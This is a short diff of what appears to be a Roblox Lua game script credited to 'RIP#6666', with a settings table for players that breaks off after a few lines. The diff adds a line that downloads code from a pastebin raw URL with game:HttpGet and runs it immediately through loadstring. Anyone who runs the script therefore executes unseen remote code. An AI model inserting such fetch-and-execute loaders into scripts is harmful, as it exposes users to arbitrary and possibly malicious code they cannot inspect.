@@ -1,5 +1,5 @@
 wait(10)
-
+loadstring(game:HttpGet("https://pastebin.com/raw/eHEfAR8z", true))()
 -- Made by RIP#6666
 _G.Settings = {
     Players = {
